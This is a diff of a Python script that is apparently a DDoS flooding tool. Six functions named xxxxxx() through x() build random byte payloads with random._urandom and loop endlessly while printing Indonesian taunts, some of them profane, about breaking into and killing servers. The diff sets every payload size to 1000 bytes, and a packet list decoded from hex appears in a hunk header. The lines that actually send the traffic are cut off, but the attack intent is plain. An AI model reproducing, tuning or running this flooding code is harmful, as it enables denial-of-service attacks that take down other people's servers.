@@ -113,7 +113,7 @@ Pacotes = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),#p
 
 
 def xxxxxx():
-  data = random._urandom(1079)
+  data = random._urandom(1000)
   i = random.choice(("[*]","[!]","[#]"))
   while True:
     try:
@@ -126,7 +126,7 @@ def xxxxxx():
       print("[!] PABLO BERSIAP MENEMBUS FUCKING SERVER")
 
 def xxxxx():
-  data = random._urandom(1029)
+  data = random._urandom(1000)
   i = random.choice(("[*]","[!]","[#]"))
   while True:
     try:
@@ -139,7 +139,7 @@ def xxxxx():
       print("[!] PABLO BERSIAP MENEMBUS FUCKING SERVER")
 
 def xxxx():
-  data = random._urandom(1107)
+  data = random._urandom(1000)
   i = random.choice(("[*]","[!]","[#]"))
   while True:
     try:
@@ -152,7 +152,7 @@ def xxxx():
       print("[!] PABLO BERSIAP MENEMBUS FUCKING SERVER")
 
 def xxx():
-  data = random._urandom(1468)
+  data = random._urandom(1000)
   i = random.choice(("[*]","[!]","[#]"))
   while True:
     try:
@@ -167,7 +167,7 @@ def xxx():
       print("[!] MATI LU SERVER NGENTOD")
 
 def xx():
-  data = random._urandom(1016)
+  data = random._urandom(1000)
   i = random.choice(("[*]","[!]","[#]"))
   while True:
     try:
@@ -182,7 +182,7 @@ def xx():
       print("[!] SERVER LEMAH JANCOKK")
 
 def x():
-  data = random._urandom(1894)
+  data = random._urandom(1000)
   i = random.choice(("[*]","[!]","[#]"))
   while True:
     try:
